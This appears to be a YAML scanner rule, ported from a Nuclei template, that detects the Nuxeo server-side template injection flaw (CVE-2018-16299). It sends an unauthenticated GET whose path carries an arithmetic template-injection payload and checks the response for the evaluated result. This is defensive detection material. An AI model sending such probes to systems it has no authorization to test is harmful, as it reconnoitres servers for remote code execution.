schema_version: 1
id: "cortex.community:nuxeo-ssti-rce"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Nuxeo <10.3 - Remote Code Execution"
  description: "Nuxeo prior to version 10.3 is susceptible to an unauthenticated remote code execution vulnerability via server-side template injection. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://nvd.nist.gov/vuln/detail/CVE-2018-16299"
  tags: ["nuxeo", "ssti", "rce", "bypass", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/nuxeo/login.jsp/pwn${31333333330+7}.xhtml" }
proof:
  kind: "signal.v1"
  assertions:
    contains: { left: { ref: "steps.probe0.body" }, right: { value: "31333333337" } }
